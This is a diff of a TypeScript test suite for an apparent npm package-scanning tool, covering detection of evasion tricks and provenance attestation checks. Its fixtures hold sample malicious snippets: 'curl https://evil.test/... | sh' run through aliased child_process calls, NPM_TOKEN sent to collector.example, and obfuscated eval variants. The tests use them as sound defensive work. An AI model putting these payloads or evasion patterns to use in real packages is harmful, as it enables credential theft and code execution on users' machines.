@@ -1,5 +1,6 @@
 import assert from "node:assert/strict";
 import { execFileSync, spawn } from "node:child_process";
+import { createHash } from "node:crypto";
 import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { createServer } from "node:http";
 import type { AddressInfo } from "node:net";
@@ -14,20 +15,28 @@ import {
   verifyTarballVsGitParity,
   walkGitHistoryForCleanAnchor,
 } from "../src/analysis/parity-and-bisect.ts";
-import { escapeMarkdownCell, triageUnpackedEntries } from "../src/analysis/static-triage.ts";
+import { escapeMarkdownCell, RULESET_SHA256, triageUnpackedEntries } from "../src/analysis/static-triage.ts";
 import { SingleFlight, SplitPlaneCache } from "../src/cache/sqlite-store.ts";
 import { appendAuditEvent, verifyAuditLog } from "../src/compliance/audit-log.ts";
 import { DEFAULT_POLICY, loadNpmrc, loadPolicy, routeDiscoveryQuery, routeRegistry } from "../src/config/policy.ts";
-import { auditDependencyConfusion, fetchWithSafeRedirects, validateOutboundUrl } from "../src/intel/registry-osv.ts";
+import {
+  auditDependencyConfusion,
+  fetchWithSafeRedirects,
+  inspectNpmAttestationBundle,
+  validateOutboundUrl,
+  verifyNpmAttestationPayload,
+} from "../src/intel/registry-osv.ts";
 import { computeSha512Integrity, unpackTarballInMemory, validateArchivePath } from "../src/quarantine/safe-unpack.ts";
+import { ENGINE_VERSION } from "../src/types.ts";
 import {
   assembleInspectionReport,
   buildReaEscalationPlan,
   checkLocalWorkspaceCompromised,
+  formatAnchorMarkdown,
   formatCycloneDxSbom,
   formatInspectionMarkdownCard,
 } from "../src/verdict/engine-and-formatters.ts";
-import { buildSyntheticTgz } from "./helpers.ts";
+import { buildSyntheticTgz, buildTestNpmSlsaAttestation } from "./helpers.ts";
 
 const DUMMY_CAPS = {
   node_version: process.version,
@@ -529,6 +538,50 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
       for (const rel of srcFiles) {
         assert.deepEqual(readFileSync(join(mirrorRoot, rel)), readFileSync(join(srcRoot, rel)), `Mirror drift in ${rel}`);
       }
+
+      // 4. Verify runtime zips exclude .github/ and tests/, package.json declares explicit allowlist, RULESET_SHA256 tracks ENGINE_VERSION, and self-audit emits dynamic version + LF
+      const zipCheckOut = execFileSync(
+        "python",
+        [
+          "-B",
+          "-c",
+          [
+            "import json, pathlib, sys, zipfile",
+            "out_dir = pathlib.Path(sys.argv[1])",
+            "for t in ('antigravity', 'claude', 'openai'):",
+            "  with zipfile.ZipFile(out_dir / f'coldpin-{t}.zip') as zf:",
+            "    names = zf.namelist()",
+            "    assert not any(n.startswith('.github/') or n.startswith('tests/') for n in names), f'{t} leaked dev files'",
+            "sys.path.insert(0, 'scripts')",
+            "import lint_skill as ls, self_audit_skillspector as sa",
+            "assert ls.extract_skill_card_version('## Skill Version(s): <br>\\n1.2.0 (source: x)') == '1.2.0'",
+            "assert ls.extract_skill_card_version('## Skill Version(s): <br>\\n1.2.0-beta.1 (source: x)') == '1.2.0-beta.1'",
+            "assert ls.extract_skill_card_version('## Skill Version(s): <br>\\n1.1.0 (source: x)') == '1.1.0'",
+            "assert ls.extract_skill_md_version('  version: \"1.2.0\"\\n') == '1.2.0'",
+            "assert ls.extract_skill_md_version('  version: \"1.2.0-rc.1\"\\n') == '1.2.0-rc.1'",
+            "sarif_tmp = out_dir / 'tmp.sarif'; md_tmp = out_dir / 'tmp.md'",
+            "findings = sa.scan_repo()",
+            "sa.emit_sarif(findings, sarif_tmp); sa.emit_triage_report(findings, md_tmp)",
+            "assert b'\\r\\n' not in sarif_tmp.read_bytes(), 'SARIF emitted CRLF'",
+            "assert b'\\r\\n' not in md_tmp.read_bytes(), 'Self-audit report emitted CRLF'",
+            "sarif_ver = json.loads(sarif_tmp.read_text(encoding='utf-8'))['runs'][0]['tool']['driver']['version']",
+            "assert sarif_ver == sys.argv[2], f'SARIF version drift: {sarif_ver} != {sys.argv[2]}'",
+            "print('HYGIENE_AND_ALLOWLIST_OK')",
+          ].join("\n"),
+          outDir,
+          ENGINE_VERSION,
+        ],
+        { encoding: "utf8" },
+      );
+      assert.ok(zipCheckOut.includes("HYGIENE_AND_ALLOWLIST_OK"));
+
+      const pkgJson = JSON.parse(readFileSync(resolve("package.json"), "utf8")) as { version: string; files?: string[] };
+      assert.equal(pkgJson.version, ENGINE_VERSION);
+      assert.ok(Array.isArray(pkgJson.files) && pkgJson.files.includes("src/") && !pkgJson.files.some((f) => f.startsWith("tests") || f.startsWith(".github")));
+      const expectedRulesetHash = createHash("sha256")
+        .update(`v${ENGINE_VERSION}|${readFileSync(resolve("rules/triage-rules.json"), "utf8")}`)
+        .digest("hex");
+      assert.equal(RULESET_SHA256, expectedRulesetHash);
     } finally {
       rmSync(outDir, { recursive: true, force: true });
     }
@@ -966,14 +1019,18 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
       );
       assert.ok(discJson.candidates.some((c) => c.package_name === "good-fmt"));
 
-      // B. Online inspect <pkg>@<ver> with boolean `--json` BEFORE target -> cooldown + direct dep KEV + floating dep warning
+      // B. Online inspect <pkg>@<ver> with boolean `--json` BEFORE target -> cooldown + direct dep KEV + floating dep warning + honest unverified provenance
       const insp = await runCli(["inspect", "--json", "fresh-cli@1.0.0", "--policy", policyPath, "--cache-dir", cacheDir]);
       assert.equal(insp.code, 2, insp.stderr); // QUARANTINE_SUSPICIOUS (cooldown + KEV)
       const inspJson = JSON.parse(insp.stdout) as {
         verdict: string;
+        info: { parity_tier: string; provenance_attested: boolean; provenance_status: string };
         evidence: Array<{ source: string; observations: Array<{ code: string }>; unknowns: string[]; coverage: { transitive_checked: boolean } }>;
       };
       assert.equal(inspJson.verdict, "QUARANTINE_SUSPICIOUS");
+      assert.equal(inspJson.info.provenance_attested, false, "unverified dist.attestations.url must NEVER claim provenance_attested=true");
+      assert.equal(inspJson.info.provenance_status, "metadata_url_only");
+      assert.equal(inspJson.info.parity_tier, "PROVENANCE_METADATA_UNVERIFIED");
       const t0 = inspJson.evidence.find((e) => e.source === "tier0_intel")!;
       assert.ok(t0.observations.some((o) => o.code === "RELEASE_COOLDOWN_QUARANTINE"), "explicit @ver must still enforce cooldown");
       assert.ok(t0.observations.some((o) => o.code === "POLICY_CISA_KEV_BLOCK"), "direct dep KEV must fire");
@@ -1039,5 +1096,442 @@ describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency 
       osvSrv.close();
       rmSync(workDir, { recursive: true, force: true });
     }
+  });
+
+  it("closes Round 2 static-triage evasion gaps (computed/data dynamic import, indirect/aliased/Reflect eval, aliased ESM/CJS sinks, multi-hop & cross-file wrappers, globalThis.process.env) with zero benign false positives", async () => {
+    const evilTgz = buildSyntheticTgz([
+      { name: "package/package.json", content: JSON.stringify({ name: "round2-evasions", version: "1.0.0", license: "MIT" }) },
+      { name: "package/dyn-import-expr.js", content: "export async function load(p) { return await import(p); }" },
+      { name: "package/dyn-import-data.js", content: 'await import("data:text/javascript,console.log(1)");' },
+      { name: "package/indirect-eval.js", content: '(0, eval)("1+1");' },
+      { name: "package/array-join-eval.js", content: 'globalThis[["ev", "al"].join("")]("1+1");' },
+      { name: "package/reflect-eval.js", content: 'const fn = Reflect.get(globalThis, "eval"); Reflect.apply(eval, null, ["1+1"]); Reflect.construct(Function, ["return 1"]); console.log(fn);' },
+      { name: "package/aliased-eval.js", content: 'const runCode = eval; runCode("1+1");' },
+      { name: "package/aliased-esm-cp.js", content: 'import { execSync as run } from "node:child_process"; run("curl https://evil.test/a.sh | sh");' },
+      { name: "package/aliased-cjs-cp.js", content: 'const { execSync: run } = require("node:child_process"); run("curl https://evil.test/b.sh | sh");' },
+      { name: "package/bracket-cp.js", content: 'import * as cp from "node:child_process"; cp["execSync"]("curl https://evil.test/c.sh | sh");' },
+      { name: "package/aliased-https.js", content: 'import { get as exfil } from "node:https"; exfil(`https://collector.example/?t=${process.env.NPM_TOKEN}`);' },
+      { name: "package/aliased-vm.js", content: 'import { runInNewContext as vmRun } from "node:vm"; vmRun("1+1");' },
+      {
+        name: "package/multihop-wrap.js",
+        content: `
+          function hop3(val) { return hop2(val); }
+          function hop2(v) { const encoded = Buffer.from(v).toString("base64"); return hop1(encoded); }
+          const hop1 = (x) => fetch("https://collector.example/m", { method: "POST", body: x });
+          hop3(process.env.NPM_TOKEN);
+        `,
+      },
+      {
+        name: "package/global-proc-env.js",
+        content: 'fetch("https://collector.example/g", { method: "POST", body: globalThis.process.env.NPM_TOKEN });',
+      },
+      { name: "package/sink-mod.js", content: 'export function report(x) { return fetch("https://collector.example/s", { method: "POST", body: x }); }' },
+      { name: "package/caller-mod.js", content: 'import { report } from "./sink-mod.js"; report(process.env.NPM_TOKEN);' },
+    ]);
+
+    const evilUnpack = await unpackTarballInMemory(evilTgz, DEFAULT_POLICY);
+    const evilTriage = triageUnpackedEntries(evilUnpack.entries, DEFAULT_POLICY);
+    const byFile = (f: string) => new Set(evilTriage.observations.filter((o) => o.path === f).map((o) => o.code));
+
+    assert.ok(byFile("dyn-import-expr.js").has("OBFUSCATED_DYNAMIC_EXEC"), "computed import(p) must be flagged");
+    assert.ok(byFile("dyn-import-data.js").has("OBFUSCATED_DYNAMIC_EXEC"), "data: dynamic import must be flagged");
+    assert.ok(byFile("indirect-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"), "indirect (0, eval) must be flagged");
+    assert.ok(byFile("array-join-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"), "array.join('') computed eval must be flagged");
+    assert.ok(byFile("reflect-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"), "Reflect.get/apply/construct eval must be flagged");
+    assert.ok(byFile("aliased-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"), "aliased eval invocation must be flagged");
+    assert.ok(byFile("aliased-esm-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"), "aliased ESM child_process must be flagged");
+    assert.ok(byFile("aliased-cjs-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"), "aliased CJS child_process must be flagged");
+    assert.ok(byFile("bracket-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"), "cp['execSync'] must be flagged");
+    assert.ok(byFile("aliased-https.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "aliased https.get exfil must be flagged");
+    assert.ok(byFile("aliased-vm.js").has("OBFUSCATED_DYNAMIC_EXEC"), "aliased vm.runInNewContext must be flagged");
+    assert.ok(byFile("multihop-wrap.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "3-hop transforming wrapper must be flagged");
+    assert.ok(byFile("global-proc-env.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "globalThis.process.env must be flagged");
+    assert.ok(byFile("caller-mod.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "cross-file exported sink wrapper must be flagged");
+
+    // Benign zero-FP controls: static import("./sub.js"), aliased git --version, clean 2-hop fetch helper
+    const cleanTgz = buildSyntheticTgz([
+      { name: "package/package.json", content: JSON.stringify({ name: "clean-round2-cli", version: "1.0.0", license: "MIT" }) },
+      { name: "package/sub.js", content: "export const ok = true;" },
+      {
+        name: "package/index.js",
+        content: `
+          import { execSync as runGit } from "node:child_process";
+          const sub = await import("./sub.js");
+          const ver = runGit("git --version", { encoding: "utf8" });
+          const doFetch = (u) => fetch(u);
+          const ping = (u) => doFetch(u);
+          await ping("https://registry.npmjs.org/-/ping");
+          console.log(sub.ok, ver);
+        `,
+      },
+    ]);
+    const cleanUnpack = await unpackTarballInMemory(cleanTgz, DEFAULT_POLICY);
+    const cleanTriage = triageUnpackedEntries(cleanUnpack.entries, DEFAULT_POLICY);
+    assert.equal(cleanTriage.observations.length, 0, `Unexpected benign FPs: ${JSON.stringify(cleanTriage.observations)}`);
+  });
+
+  it("enforces npm provenance epistemic rigor (distinguishes unverified URL metadata and unanchored leaf DSSE from Sigstore trust-root verification, and blocks tampered SLSA digests/signatures)", async () => {
+    const cleanTgz = buildSyntheticTgz([
+      { name: "package/package.json", content: JSON.stringify({ name: "prov-cli", version: "1.2.3", license: "MIT", bin: { prov: "./cli.js" } }) },
+      { name: "package/cli.js", content: "console.log('prov-ok');\n" },
+    ]);
+    const sha512 = computeSha512Integrity(cleanTgz);
+    const unpack = await unpackTarballInMemory(cleanTgz, DEFAULT_POLICY, sha512);
+    const triage = triageUnpackedEntries(unpack.entries, DEFAULT_POLICY);
+    const strictPolicy = { ...DEFAULT_POLICY, require_provenance: true };
+
+    // 1. Unverified dist.attestations.url presence alone -> PROVENANCE_METADATA_UNVERIFIED, provenance_attested=false, fails strict require_provenance
+    const metaOnlyParity = verifyTarballVsGitParity({
+      tarballManifest: triage.manifest,
+      tarballEntries: unpack.entries,
+      provenanceAttested: false,
+      provenanceStatus: "metadata_url_only",
+      provenanceUrl: "https://registry.npmjs.org/-/npm/v1/attestations/prov-cli@1.2.3",
+    });
+    assert.equal(metaOnlyParity.tier, "PROVENANCE_METADATA_UNVERIFIED");
+    assert.equal(metaOnlyParity.provenance_attested, false);
+    assert.ok(metaOnlyParity.unknowns.some((u) => u.startsWith("PROVENANCE_CRYPTO_UNVERIFIED")));
+    const strictMetaReport = assembleInspectionReport({
+      package_name: "prov-cli",
+      version: "1.2.3",
+      org_or_scope: "unscoped",
+      creator: "dev",
+      category_tags: [],
+      summary: "ok",
+      license: "MIT",
+      bin_names: ["prov"],
+      unpack,
+      triage,
+      parity: metaOnlyParity,
+      advisories: [],
+      registryObservations: [],
+      registryUnknowns: [],
+      policy: strictPolicy,
+      host_capabilities: DUMMY_CAPS,
+      cwd: tmpdir(),
+    });
+    assert.equal(strictMetaReport.verdict, "UNVERIFIABLE_UNKNOWN");
+    assert.equal(strictMetaReport.info.provenance_attested, false);
+    assert.equal(strictMetaReport.info.provenance_status, "metadata_url_only");
+
+    // 2. Valid ECDSA leaf-signed DSSE SLSA bundle with matching tarball SHA-512 -> dsse_leaf_verified_unanchored, STILL provenance_attested=false (honest Fulcio/Rekor boundary!)
+    const validAtt = buildTestNpmSlsaAttestation({ packageName: "prov-cli", version: "1.2.3", tarballSha512Sri: sha512 });
+    const leafInsp = verifyNpmAttestationPayload(validAtt, sha512, "prov-cli", "https://registry.npmjs.org/att");
+    assert.equal(leafInsp.status, "dsse_leaf_verified_unanchored");
+    assert.equal(leafInsp.provenance_attested, false);
+    assert.equal(leafInsp.observations.length, 0);
+    assert.ok(leafInsp.unknowns.some((u) => u.startsWith("PROVENANCE_TRUST_ROOT_UNVERIFIED")));
+
+    const leafParity = verifyTarballVsGitParity({
+      tarballManifest: triage.manifest,
+      tarballEntries: unpack.entries,
+      provenanceAttested: false,
+      provenanceInspection: leafInsp,
+    });
+    assert.equal(leafParity.tier, "PROVENANCE_UNANCHORED_DSSE");
+    assert.equal(leafParity.provenance_attested, false);
+
+    // Under require_provenance=true, unanchored leaf DSSE STILL fails closed (UNVERIFIABLE_UNKNOWN)!
+    const strictLeafReport = assembleInspectionReport({
+      package_name: "prov-cli",
+      version: "1.2.3",
+      org_or_scope: "unscoped",
+      creator: "dev",
+      category_tags: [],
+      summary: "ok",
+      license: "MIT",
+      bin_names: ["prov"],
+      unpack,
+      triage,
+      parity: leafParity,
+      advisories: [],
+      registryObservations: [],
+      registryUnknowns: [],
+      policy: strictPolicy,
+      host_capabilities: DUMMY_CAPS,
+      cwd: tmpdir(),
+    });
+    assert.equal(strictLeafReport.verdict, "UNVERIFIABLE_UNKNOWN");
+    const sbomLeaf = formatCycloneDxSbom(strictLeafReport) as {
+      metadata: { component: { properties: Array<{ name: string; value: string }> } };
+    };
+    assert.ok(
+      sbomLeaf.metadata.component.properties.some(
+        (p) => p.name === "coldpin:provenance-status" && p.value === "dsse_leaf_verified_unanchored",
+      ),
+    );
+
+    // 3. Tampered SLSA subject SHA-512 -> CRITICAL PROVENANCE_DIGEST_MISMATCH -> MALICIOUS_INDICATORS_FOUND
+    const badDigestAtt = buildTestNpmSlsaAttestation({
+      packageName: "prov-cli",
+      version: "1.2.3",
+      tarballSha512Sri: sha512,
+      tamperDigest: true,
+    });
+    const badDigestInsp = verifyNpmAttestationPayload(badDigestAtt, sha512, "prov-cli");
+    assert.equal(badDigestInsp.status, "verification_failed");
+    assert.ok(badDigestInsp.observations.some((o) => o.code === "PROVENANCE_DIGEST_MISMATCH" && o.severity === "CRITICAL"));
+
+    // 4. Tampered DSSE signature -> CRITICAL PROVENANCE_DSSE_SIGNATURE_INVALID -> MALICIOUS_INDICATORS_FOUND
+    const badSigAtt = buildTestNpmSlsaAttestation({
+      packageName: "prov-cli",
+      version: "1.2.3",
+      tarballSha512Sri: sha512,
+      tamperSignature: true,
+    });
+    const badSigInsp = verifyNpmAttestationPayload(badSigAtt, sha512, "prov-cli");
+    assert.equal(badSigInsp.status, "verification_failed");
+    assert.ok(badSigInsp.observations.some((o) => o.code === "PROVENANCE_DSSE_SIGNATURE_INVALID" && o.severity === "CRITICAL"));
+
+    // 5. Mismatched package identity in SLSA subject -> CRITICAL PROVENANCE_DIGEST_MISMATCH
+    const badPkgAtt = buildTestNpmSlsaAttestation({
+      packageName: "prov-cli",
+      version: "1.2.3",
+      tarballSha512Sri: sha512,
+      overrideSubjectName: "pkg:npm/other-pkg@1.2.3",
+    });
+    const badPkgInsp = verifyNpmAttestationPayload(badPkgAtt, sha512, "prov-cli");
+    assert.equal(badPkgInsp.status, "verification_failed");
+    assert.ok(badPkgInsp.observations.some((o) => o.code === "PROVENANCE_DIGEST_MISMATCH"));
+
+    // 6. Live local HTTP CLI E2E with real leaf-signed attestation endpoint AND tampered attestation endpoint
+    const workDir = mkdtempSync(join(tmpdir(), "coldpin-prov-http-"));
+    let serveTampered = false;
+    const srv = createServer((req, res) => {
+      const url = new URL(req.url ?? "/", "http://127.0.0.1");
+      const base = `http://127.0.0.1:${(srv.address() as AddressInfo).port}`;
+      const oldDate = new Date(Date.now() - 30 * 24 * 3600 * 1000).toISOString();
+      if (url.pathname === "/prov-cli") {
+        res.writeHead(200, { "content-type": "application/json" });
+        res.end(
+          JSON.stringify({
+            name: "prov-cli",
+            "dist-tags": { latest: "1.2.3" },
+            time: { created: oldDate, "1.2.3": oldDate },
+            versions: {
+              "1.2.3": {
+                name: "prov-cli",
+                version: "1.2.3",
+                license: "MIT",
+                bin: { prov: "./cli.js" },
+                dist: { tarball: `${base}/prov.tgz`, integrity: sha512, attestations: { url: `${base}/att` } },
+              },
+            },
+          }),
+        );
+        return;
+      }
+      if (url.pathname === "/prov.tgz") {
+        res.writeHead(200, { "content-type": "application/octet-stream", "content-length": String(cleanTgz.length) });
+        res.end(cleanTgz);
+        return;
+      }
+      if (url.pathname === "/att") {
+        res.writeHead(200, { "content-type": "application/json" });
+        res.end(JSON.stringify(serveTampered ? badDigestAtt : validAtt));
+        return;
+      }
+      if (req.method === "POST" && url.pathname === "/v1/querybatch") {
+        res.writeHead(200, { "content-type": "application/json" });
+        res.end(JSON.stringify({ results: [{ vulns: [] }] }));
+        return;
+      }
+      res.writeHead(404);
+      res.end();
+    });
+    await new Promise<void>((r) => srv.listen(0, "127.0.0.1", () => r()));
+    const port = (srv.address() as AddressInfo).port;
+    const polPath = join(workDir, "policy.json");
+    const strictPolPath = join(workDir, "strict-policy.json");
+    writeFileSync(polPath, JSON.stringify({ default_registry: `http://127.0.0.1:${port}`, osv_api_url: `http://127.0.0.1:${port}` }));
+    writeFileSync(
+      strictPolPath,
+      JSON.stringify({ default_registry: `http://127.0.0.1:${port}`, osv_api_url: `http://127.0.0.1:${port}`, require_provenance: true }),
+    );
+    const cliPath = resolve("src/cli.ts");
+    const runCli = (args: string[]) =>
+      new Promise<{ code: number; stdout: string; stderr: string }>((res) => {
+        const p = spawn(process.execPath, ["--no-warnings", cliPath, ...args]);
+        let stdout = "";
+        let stderr = "";
+        p.stdout.on("data", (d) => (stdout += String(d)));
+        p.stderr.on("data", (d) => (stderr += String(d)));
+        p.on("close", (code) => res({ code: code ?? 1, stdout, stderr }));
+      });
+
+    try {
+      // Default policy: valid leaf-signed DSSE succeeds with honest dsse_leaf_verified_unanchored (provenance_attested=false)
+      const rDefault = await runCli(["inspect", "--json", "prov-cli@1.2.3", "--policy", polPath, "--cache-dir", ":memory:"]);
+      assert.equal(rDefault.code, 0, rDefault.stderr);
+      const jDefault = JSON.parse(rDefault.stdout) as { info: { parity_tier: string; provenance_status: string; provenance_attested: boolean } };
+      assert.equal(jDefault.info.parity_tier, "PROVENANCE_UNANCHORED_DSSE");
+      assert.equal(jDefault.info.provenance_status, "dsse_leaf_verified_unanchored");
+      assert.equal(jDefault.info.provenance_attested, false);
+
+      // Strict require_provenance=true: unanchored leaf DSSE fails closed (exit 2 UNVERIFIABLE_UNKNOWN)
+      const rStrict = await runCli(["inspect", "--json", "prov-cli@1.2.3", "--policy", strictPolPath, "--cache-dir", ":memory:"]);
+      assert.equal(rStrict.code, 2, rStrict.stderr);
+      const jStrict = JSON.parse(rStrict.stdout) as { verdict: string };
+      assert.equal(jStrict.verdict, "UNVERIFIABLE_UNKNOWN");
+
+      // Tampered SLSA subject digest: fails hard with exit 3 MALICIOUS_INDICATORS_FOUND
+      serveTampered = true;
+      const rTamper = await runCli(["inspect", "--json", "prov-cli@1.2.3", "--policy", polPath, "--cache-dir", ":memory:"]);
+      assert.equal(rTamper.code, 3, rTamper.stderr);
+      const jTamper = JSON.parse(rTamper.stdout) as { verdict: string };
+      assert.equal(jTamper.verdict, "MALICIOUS_INDICATORS_FOUND");
+    } finally {
+      srv.close();
+      rmSync(workDir, { recursive: true, force: true });
+    }
+  });
+
+  it("closes ASI/semicolon-free, optional-chaining, indirect/.call/.apply/.bind, createRequire, string-concat/reverse, barrel re-export, benign FP, strict PURL/version/private-provenance, require_provenance resolve-anchor, and packager negative-link gates", async () => {
+    // 1. Adversarial ASI/semicolon-free, optional-chaining, indirect calls, .call/.apply/.bind, createRequire, string concat/reverse, Function.prototype.constructor, barrel re-export
+    const advTgz = buildSyntheticTgz([
+      { name: "package/package.json", content: JSON.stringify({ name: "r2-audit-evasions", version: "1.0.0", license: "MIT" }) },
+      { name: "package/asi-eval.js", content: 'const runCode = eval\nrunCode("1+1")' },
+      { name: "package/asi-cp.js", content: 'import { execSync } from "node:child_process"\nconst cmd = "curl https://evil.test/s | sh"\nexecSync(cmd)' },
+      { name: "package/asi-proc.js", content: 'const p = process\nfetch("https://collector.example/p", { body: JSON.stringify(p.env) })' },
+      { name: "package/asi-bracket.js", content: 'const a = "ev"\nconst b = "al"\nconst fn = a + b\nglobalThis[fn]("1+1")' },
+      { name: "package/indirect-fn.js", content: '(0, Function)("return 1")();' },
+      { name: "package/indirect-cp.js", content: 'import { execSync } from "node:child_process"; (0, execSync)("curl https://evil.test/s | sh");' },
+      { name: "package/indirect-fetch.js", content: '(0, fetch)("https://collector.example/f", { body: process.env.NPM_TOKEN });' },
+      { name: "package/opt-chain.js", content: 'const x = process?.env?.NPM_TOKEN; fetch("https://collector.example/o", { body: x });' },
+      { name: "package/create-req.js", content: 'import { createRequire } from "node:module"; const req = createRequire(import.meta.url); const { execSync: run } = req("node:child_process"); run("curl https://evil.test/r.sh | sh");' },
+      { name: "package/dot-call-eval.js", content: 'eval.call(null, "1+1");' },
+      { name: "package/dot-apply-cp.js", content: 'import { execSync } from "node:child_process"; execSync.apply(null, ["curl https://evil.test/s | sh"]);' },
+      { name: "package/dot-call-fetch.js", content: 'fetch.call(globalThis, "https://collector.example/c", { body: process.env.NPM_TOKEN });' },
+      { name: "package/dot-bind-eval.js", content: 'const bound = eval.bind(null); bound("1+1");' },
+      { name: "package/proto-ctor.js", content: 'Function.prototype.constructor("return 1")();' },
+      { name: "package/rev-join.js", content: 'globalThis[["l", "a", "v", "e"].reverse().join("")]("1+1");' },
+      { name: "package/split-rev.js", content: 'globalThis["lave".split("").reverse().join("")]("1+1");' },
+      { name: "package/sink.js", content: 'export function sendOut(v) { return fetch("https://collector.example/b", { body: v }); }' },
+      { name: "package/barrel.js", content: 'export { sendOut } from "./sink.js";' },
+      { name: "package/caller.js", content: 'import { sendOut } from "./barrel.js"; sendOut(process.env.NPM_TOKEN);' },
+    ]);
+    const advUnpack = await unpackTarballInMemory(advTgz, DEFAULT_POLICY);
+    const advTriage = triageUnpackedEntries(advUnpack.entries, DEFAULT_POLICY);
+    const codes = (f: string) => new Set(advTriage.observations.filter((o) => o.path === f).map((o) => o.code));
+
+    assert.ok(codes("asi-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"));
+    assert.ok(codes("asi-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"));
+    assert.ok(codes("asi-proc.js").has("ENV_SERIALIZATION_EXFIL"));
+    assert.ok(codes("asi-bracket.js").has("OBFUSCATED_DYNAMIC_EXEC"));
+    assert.ok(codes("indirect-fn.js").has("OBFUSCATED_DYNAMIC_EXEC"));
+    assert.ok(codes("indirect-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"));
+    assert.ok(codes("indirect-fetch.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"));
+    assert.ok(codes("opt-chain.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"));
+    assert.ok(codes("create-req.js").has("CHILD_PROCESS_DANGEROUS_EXEC"));
+    assert.ok(codes("dot-call-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"));
+    assert.ok(codes("dot-apply-cp.js").has("CHILD_PROCESS_DANGEROUS_EXEC"));
+    assert.ok(codes("dot-call-fetch.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"));
+    assert.ok(codes("dot-bind-eval.js").has("OBFUSCATED_DYNAMIC_EXEC"));
+    assert.ok(codes("proto-ctor.js").has("OBFUSCATED_DYNAMIC_EXEC"));
+    assert.ok(codes("rev-join.js").has("OBFUSCATED_DYNAMIC_EXEC"));
+    assert.ok(codes("split-rev.js").has("OBFUSCATED_DYNAMIC_EXEC"));
+    assert.ok(codes("caller.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "barrel re-export chain must propagate exported sinks");
+
+    // 2. Benign FP fixes: array literal ["eval"], RegExp variable re.exec(process.env.CUSTOM), class method import(x) {}
+    const fpTgz = buildSyntheticTgz([
+      { name: "package/package.json", content: JSON.stringify({ name: "benign-fp-guards", version: "1.0.0", license: "MIT" }) },
+      {
+        name: "package/index.js",
+        content: `
+          const reserved = ["eval"];
+          const nested = [["Function"]];
+          const re = /^prod/;
+          const re2 = new RegExp("^dev");
+          const m1 = re.exec(process.env.MY_CUSTOM_MODE || "");
+          const m2 = re2.exec(process.env.MY_CUSTOM_MODE || "");
+          class PluginLoader { import(x) { return x; } }
+          console.log(reserved, nested, m1, m2, new PluginLoader().import("ok"));
+        `,
+      },
+    ]);
+    const fpUnpack = await unpackTarballInMemory(fpTgz, DEFAULT_POLICY);
+    const fpTriage = triageUnpackedEntries(fpUnpack.entries, DEFAULT_POLICY);
+    assert.equal(fpTriage.observations.length, 0, `Unexpected benign FPs: ${JSON.stringify(fpTriage.observations)}`);
+
+    // 3. Strict npm provenance: non-PURL name, missing name, wrong version, private-scope fetch suppression, early-return parity status preservation
+    const sha = computeSha512Integrity(fpTgz);
+    const nonPurl = buildTestNpmSlsaAttestation({ packageName: "prov-cli", version: "1.2.3", tarballSha512Sri: sha, overrideSubjectName: "not-a-purl" });
+    assert.equal(verifyNpmAttestationPayload(nonPurl, sha, "prov-cli", undefined, "1.2.3").status, "verification_failed");
+    const wrongVer = buildTestNpmSlsaAttestation({ packageName: "prov-cli", version: "9.9.9", tarballSha512Sri: sha });
+    assert.equal(verifyNpmAttestationPayload(wrongVer, sha, "prov-cli", undefined, "1.2.3").status, "verification_failed");
+    const privAtt = await inspectNpmAttestationBundle({
+      attestationUrl: "https://registry.npmjs.org/-/npm/v1/attestations/@acme%2Fsecret@1.0.0",
+      expectedTarballSha512: sha,
+      expectedPackageName: "@acme/secret",
+      expectedPackageVersion: "1.0.0",
+      route: "private",
+      allowedAuthOrigin: "https://artifactory.acme.internal",
+    });
+    assert.equal(privAtt.status, "metadata_url_only");
+    assert.ok(privAtt.unknowns.some((u) => u.startsWith("PRIVATE_SCOPE_PROVENANCE_FETCH_SUPPRESSED")));
+
+    const earlyParity = verifyTarballVsGitParity({
+      tarballManifest: null,
+      tarballEntries: fpUnpack.entries,
+      provenanceAttested: false,
+      provenanceStatus: "verification_failed",
+      provenanceUrl: "https://registry.npmjs.org/att",
+      localGitDir: resolve("."),
+    });
+    assert.equal(earlyParity.provenance_status, "verification_failed");
+    assert.equal(earlyParity.tier, "TARBALL_SOURCE_DRIFT");
+
+    // 4. resolve-anchor under require_provenance=true MUST suppress commands when release lacks Sigstore verification
+    const tmpRepo = mkdtempSync(join(tmpdir(), "coldpin-prov-anchor-"));
+    try {
+      const git = (a: string[]) => execFileSync("git", a, { cwd: tmpRepo, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
+      git(["init", "-b", "main"]);
+      git(["config", "user.name", "T"]);
+      git(["config", "user.email", "t@e.com"]);
+      writeFileSync(join(tmpRepo, "package.json"), JSON.stringify({ name: "strict-anchor", version: "1.0.0", license: "MIT", bin: { sa: "./cli.js" } }));
+      writeFileSync(join(tmpRepo, "cli.js"), "console.log('clean');\n");
+      git(["add", "."]);
+      git(["commit", "-m", "v1 clean"]);
+      const c1 = git(["rev-parse", "HEAD"]);
+
+      const strictHead = walkGitHistoryForCleanAnchor({
+        package_name: "strict-anchor",
+        repoUrlOrLocalPath: tmpRepo,
+        isLocalDir: true,
+        policy: { ...DEFAULT_POLICY, require_provenance: true },
+        releaseTarballByCommit: new Map([[c1, { version: "1.0.0", tarball_sha512: sha, provenance_attested: false, provenance_status: "dsse_leaf_verified_unanchored" }]]),
+      });
